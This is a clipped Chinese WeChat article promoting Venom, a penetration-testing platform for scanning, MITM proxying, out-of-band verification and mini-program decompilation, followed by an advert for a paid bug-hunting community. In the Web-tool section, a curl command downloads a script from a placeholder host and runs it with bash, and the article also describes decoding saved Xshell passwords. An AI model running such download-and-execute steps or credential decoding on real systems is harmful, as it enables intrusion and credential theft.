---
title: 【微信】[工具推荐]专为渗透测试工程师和安全研究员设计的新一代集成化安全测试平台-Venom
source: https://mp.weixin.qq.com/s/x1oWwTu9GWy9afY1p_G8Ng
source_host: mp.weixin.qq.com
clip_date: 2026-11-08T03:52:00+08:00
trace_id: 4c3f91eb-d382-4c4e-b6f9-f0627aa0c781
content_hash: aa81c5cc5dcfa80b445ff17501b3587aeafa51bbcccf8e7240039b460352df99
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 49
  succeeded: 49
  failed_urls: []
notion_page_id: 41175244-d011-81cf-b320-eefacf078e25
ioc: null
---

**陌笙不太懂安全** *2026年11月7日 17:41*

```javascript
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

工具介绍

Venom 是专为渗透测试工程师和安全研究员设计的新一代集成化安全测试平台。项目由 Electron + Vue3 桌面端和 Go 编写的本地引擎组成，通过 gRPC 将资产测绘、端口扫描、数据处理、MITM 代理、Web 辅助工具、小程序反编译、Agent 智能体和 MCP 扩展等能力整合到统一工作台中。Venom 的定位不是堆满入口的大而全菜单，而是把红队与安全测试过程中常见的重复动作收口到一套可联动的流程里：测绘结果可以直接送入端口扫描，抓到的流量可以送入加解密工作流，调通的工作流又可以挂回 MITM 规则中自动执行，复杂分析任务也可以交给 Agent 调用技能、指令和 MCP 工具持续推进。

## 核心功能

| 功能模块 | 核心价值 | 当前能力 |
| --- | --- | --- |
| 🤖 Agent 智能体 | 将多轮安全分析沉淀为可控的智能工作台 | 会话管理、Agent 工作区、模型选择、手动审批、技能启停、指令调用、分析过程与结论沉淀 |
| 🔌 MCP 服务扩展 | 让 Agent 调用外部工具、本地脚本和自建服务 | MCP 服务器管理、工具发现与调用、与技能/指令联动、适配自建安全服务和知识库 |
| 🚀 端口扫描 | 快速发现开放端口和 Web 暴露面 | 批量目标导入、端口策略预设、自定义端口、主机发现、协议识别、Web 指纹识别、Socks5 代理、实时进度和结果表格 |
| 🗺️ 空间测绘 | 聚合外部测绘结果并收敛攻击面 | FOFA、Hunter、DayDayMap 查询，测绘语法收藏，结果复制，选中资产发送到端口扫描 |
| 🔐 数据处理 | 快速清洗、比较和转换数据 | JSON 查询与 CSV 导出、文本差异对比、可视化加解密工作流、预设保存/分享/导入 |
| 🧩 加解密工作流 | 把一次性数据处理变成可复用流水线 | Base64/Base32/URL/Unicode/Hex/XOR，MD5/SHA/SM3/HMAC，AES/DES/3DES/RC4/SM4，RSA/SM2，参数处理与 DSL 辅助函数 |
| 🛰️ MITM 代理 | 在流量入口层完成捕获、命中、改写和转发 | HTTP/HTTPS 监听、CA 导出与状态检测、上游 HTTP/HTTPS/SOCKS5、触发器、请求/响应修改规则、与加解密预设联动 |
| 📡 Web 工具 | 配合 Vnx 提供带外验证与投递能力 | 302 跳转、文件管理、DNSLog、HTTPLog，支持 API Key 配置和连通性检测 |
| 📱 微信小程序反编译 | 辅助分析本地微信小程序包 | 扫描 Applet 目录、小程序信息识别、多版本反编译、敏感信息提取、自定义提取规则、协同调试服务 |
| 🔥 POC 模板生成 | 快速构建标准化验证模板 | HTTP 类型 POC 模板生成、基础信息、风险等级、Matcher、Extractor、YAML 预览与复制 |
| 🛠️ 其他工具 | 管理常用工具和本地凭据分析 | 自定义快捷方式启动器、Xshell 会话密码解码 |

工具使用

### 场景一：🤖 Agent 智能体与安全技能编排

Agent 工作台用于承接需要多轮推理、资料整理和工具联动的安全分析任务。每个任务可以作为独立会话保存，配合 agent-workspace 保留上下文、过程产物和最终结论，适合做小程序敏感信息分析、服务暴露面研判、规则解释、报告整理等工作。

右侧技能面板可以按任务启停能力，例如微信小程序反编译、源码敏感信息分析、端口扫描与服务识别、编码解码、DNSLog 与 HTTPLog 回连验证、MITM 流量证据分析等。技能可以单独查看、开启或关闭，让 Agent 只使用当前任务真正需要的能力。

Agent 执行时支持模型选择和手动审批。涉及工具调用、文件操作、外部请求或需要确认的动作时，可以先由用户审批，再继续执行，避免自动化流程越权推进。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ab6d77ab8a98a233.png)

### 场景二：🔌 MCP 服务器扩展

MCP 服务器模块用于把 Venom 外部的能力接入 Agent。可以将内部资产平台、自研扫描器、漏洞库、知识库、脚本工具或其他支持 MCP 的服务注册为可调用工具，让 Agent 在会话中按需查询、分析和整理结果。

MCP 能力可以和技能、指令一起使用：指令负责固化常用提示词和操作规范，技能负责封装安全场景能力，MCP 负责补齐外部数据源和工具执行能力。对于企业内网环境或私有化工具链，可以通过 MCP 把现有能力挂到 Venom 的智能体工作流中。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d921bf867b943128.png)

### 场景三：🌐 资产测绘与端口扫描联动

从外部测绘平台快速收敛资产，再进入本地扫描确认真实暴露面。

**空间测绘**：支持 **FOFA / Hunter / DayDayMap**。配置 API Key 后即可查询资产，结果表格支持字段选择、分页、复制和语法收藏。

**发送到端口扫描**：在测绘结果中选中 IP 或域名，可以直接发送到端口扫描模块，减少手工整理目标的时间。

**端口扫描**：支持从文件、剪贴板或文本框批量导入目标，内置 Web 常用、Top100、Top1000、RCE、精简、全端口等策略，也可以直接填写自定义端口。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7c7af9381ccaaf07.png)

### 场景四：🚀 协议识别与 Web 指纹探测

端口扫描不只返回“开了哪个端口”，还会尽量补齐后续判断需要的信息。

扫描配置支持端口扫描、协议识别、Web 指纹三个阶段独立启停，并可以分别设置线程、超时、重试等参数。结果表格会展示主机、端口、协议、版本、状态码、标题、Web Server、组件和 Banner，方便继续定位高价值服务。

需要走代理的场景，可以在扫描配置中填写 Socks5 代理。

### 场景五：🔐 数据清洗、对比与加解密工作流

把常见的数据处理动作集中在一个地方完成。

**JSON 提取**：粘贴 JSON 后输入查询语法即可提取目标字段，结果可以转表格或导出 CSV。

**数据对比**：内置双栏 Diff 编辑器，适合快速比较两次请求、响应或配置差异。

**加解密工作流**：从左侧拖入编码、摘要、对称加密、非对称加密等组件，按顺序组成处理流水线。调通后可以保存为预设，也可以分享或导入配置。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8617aca631df6ec7.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d8553c8af11aa8ba.png)

### 场景六：🛰️ MITM 自动签名与自动改写

MITM 模块用于承接 HTTP/HTTPS 流量，并在进入上游之前完成匹配、改写和预处理。

当前模块包含 **代理流量、代理监听、上游代理、触发器、修改规则**。监听器负责接入流量，触发器负责判断哪些请求进入处理链，修改规则负责读取字段、拼接输入、调用加解密预设并写回 Header、Query、Form、JSON Body 或 Raw Body。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cda030c7a0c50638.png)

典型链路可以是：

```nginx
Client -> Venom MITM -> Burp / 上游代理 -> Target
```

对于动态签名、请求体加密、响应解包、字段重算等场景，可以先在“数据处理 / 加解密”中拖出工作流并保存为预设，再在 MITM 修改规则中引用，让流量经过时自动处理。

### 场景七：📡 Web 工具与带外验证

Web 工具模块需要先配置并连通 **Vnx** 服务，配置项包含 Vnx 地址和 API Key。连通后可使用以下能力：

**302 跳转**：创建可控跳转链接，支持启停、复制、访问和访问次数统计。

**文件管理**：上传文件并生成下载链接或文本链接，适合投递脚本、EXP、配置文件等临时资源。

**DNSLog / HTTPLog**：生成专属域名或监听 URL，支持刷新和自动刷新，用于验证无回显漏洞、SSRF、Blind RCE 等场景。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/eb7370b1fccf6ef5.png)

```bash
curl -k -L https://xxxx/file/1/file -o echo.sh && chmod +x echo.sh && bash echo.sh
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/eb2db728e04fa297.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9e75f6e25fc4eef1.png)

### 场景八：📱 微信小程序反编译与信息提取

微信小程序模块面向本地微信 Applet 目录分析。

配置 Applet 路径和输出目录后，可以扫描本地小程序包，识别 AppID、主体、名称、版本等信息；对指定版本执行反编译后，可以打开输出目录查看源码，也可以按规则提取接口、页面路径、配置、敏感字段等信息。

规则配置页支持新增、修改、删除提取规则。协同服务可用于配合 `venom-wxmp` 做局域网调试和页面跳转。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/96f2d5f72588d64b.png)

### 场景九：🔥 POC 模板生成与常用工具启动

**POC 模板生成** 当前处于 BETA 阶段，主要用于快速生成 HTTP 类型验证模板。可以填写模板 ID、名称、作者、风险等级、描述、参考链接、Classification、Metadata、请求、Matcher 和 Extractor，右侧实时生成 YAML 并支持复制。

**快捷方式** 支持把本地常用工具加入 Venom 面板，可配置程序路径、工作目录、启动参数、环境变量和图标。

**Xshell 密码解码** 支持输入 Xshell 会话文件或目录路径，自动使用当前 Windows 用户 SID 和用户名，也可以手动指定，用于批量解析会话中的主机、端口、账号和密码。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d8414592088113f1.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/25429cf895c07e8f.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cba52f3424c0d31b.png)

工具链接

```javascript
https://github.com/Zcentury/Venom/
```

**后台回复加群加入交流群  
**

**广告：** **cisp pte/pts &nisp1级2级低价报考**

**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库** **简单介绍** **（** **加入纷传圈子** **送知识库+漏洞库+面试题库** **）**

如果觉得合适可以加入,圈子目前价格39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。

**圈子福利**

**edu漏洞挖掘1v1指导出洞**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/133744e78ee257e6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e551ca7a6839aaa0.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/edcf3331ac3974c3.png)

**skill+grok辅助挖掘某企业sr** **c** **实战效果，能出但是重复多，agent独立挖掘也可以，见仁见智，看个人习惯，好的模型是最重要的。**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c1a9cb8ad09b809b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5660c0ddec5f2a89.png)

**企业src边缘&核心资产实战效果&&有重复但是证明好模型+AI确实够用**

**（图片仅供参考，我出不等于你出，见识 **到** ai神力即可，多去用AI!!!）**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/77c229aa0236778a.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cf0a0169d7cc3bcf.png)

**不是P图,单洞1.2w记录**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8e86e33ca119e426.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b4c93939079de786.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/53f2903e2c542dfd.png)

**陌笙src挖掘知识库介绍（内容持续更新中!!!)**

```css
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)
弱口令漏洞&未授权访问漏洞挖掘
任意文件读取&删除&下载&上传漏洞
sql注入漏洞
url重定向漏洞
csrf&ssrf漏洞挖掘
XSS&XXE漏洞挖掘等等常见漏洞
cors&目录遍历&越权漏洞挖掘
EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)
CNVD挖掘技巧分享&实战案例报告编写
公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）
SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)
经典常见Nday漏洞(常见中间件&以及各种常见框架)复现
云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）
AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）
APP&小程序漏洞挖掘
等各模块不在一一介绍
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a5a9526c04ca82e2.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/55d95f056e0ccf90.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3121dfe6083ea07e.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e578c40e9cd61e62.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/24f96a9898859025.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0458ef9d7a83cbed.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/db0608e7dbfad79e.png)

信息收集

src挖掘基础

src挖掘实战

edusrc

经典nday复现

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/91feed6aac03f174.png)

云安全&AI安全

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dd7acc8d3a29bd0d.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dd8a29373cb7ad97.png)

**陌笙安全漏洞库介绍**

```sql
最新漏洞查看
1day&0day分享
EDU学校相关漏洞
Web应用漏洞
CMS漏洞
OA产品漏洞
中间件漏洞
云安全漏洞
人工智能漏洞
其他漏洞
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f639476be4ccc8b6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/930f6c88a39ecca5.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4b8135c0c2526f85.png)

**陌笙安全面试库**

```javascript
渗透测试基本问题一汇总
渗透测试基本问题二汇总
渗透测试基本问题三汇总
微步护网面试题目
长亭科技面试
深信服护网面试
启明星辰渗透测试面试题目
安恒面试题目
绿盟笔试题目
360面试
奇安信护网面试
运维面试题目
运维面试题库
网安面试相关文档大全
相关面试文章推荐
等等
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/68bba849a294ed14.png)

**POC库** **&&更新适配afrog&&nuclei&&dddd的POC&1day/Nday等&&** ****dddd二开**** **工具\[助力渗透测试&&红蓝攻防\]**

**工具截图**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9d063db28ae4ceb5.png)

**实战效果**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b1f6a12faa09436b.png)

**poc库【后续持续更新】**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6289c17ff054c179.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5bde621a04c52bca.png)

**AI赋能-** **skill辅助** **漏洞挖掘（免责&&慎用）**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6b8b6a5c558fd865.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/73be12b15c4989b8.png)

**圈友skill+ai辅助渗透** **实战效果** **，支持打假！**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/85c2afd29e97a606.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3bf49d95d9bf7df6.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/64cb8b21d0c77ec4.png)

证书站

普通站点

**陌笙** **纷传圈子介** **绍**

```apache
1、src挖掘思维导图，信息收集思维导图，edusrc挖掘思维导图，以及后续的红队&面试思维导图&自己网安笔记等持续更新
2、2025-2026的edusrc实战报告包含证书站和非证书站以及2025之前的各种优质报思路分享
3、各种src报告思路分享（内部&外部）
4、分享各种src挖掘&edusrc挖掘培训资料&视频
5、不定期分享通杀、0day
6、有圈子群可以技术交流以及不定期抽取证书&免费rank
7.分享各种护网资料各家安全厂商讲解视频&精选实战面试题目
8、各种框架漏洞技巧分享
9、各种源码分享（泛微、正方系统、用友等）
10、漏洞挖掘工具&信息收集工具&内网渗透免杀等网安工具分享
11、各种ctf资料以及题目分享
12、cnvd挖掘技巧&CNVD资产&src资产分享&补天1权重资产分享&fofakey共用
13、免杀、逆向、红队攻内网防渗透等课程分享
14、漏洞库&字典以各种内容不在一一说明
15、cisp-pte/pts&nisp一级&nisp二级&edusrc证书内部价格
15、如果有漏洞挖掘问题或者工具资料需求可以找群主(尽量满足)
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/087e8c93f06bfc42.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/db599fd789126f7d.png)

**目前800多条内容，扫描下方二维码查看详情以及加入圈子，持续更新中。。**

**如果觉得合适可以加入，价格不定期会根据圈子内容和圈子人数进行上调。。**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e8e0f7f5e142796f.png)

渗透测试常用工具 · 目录
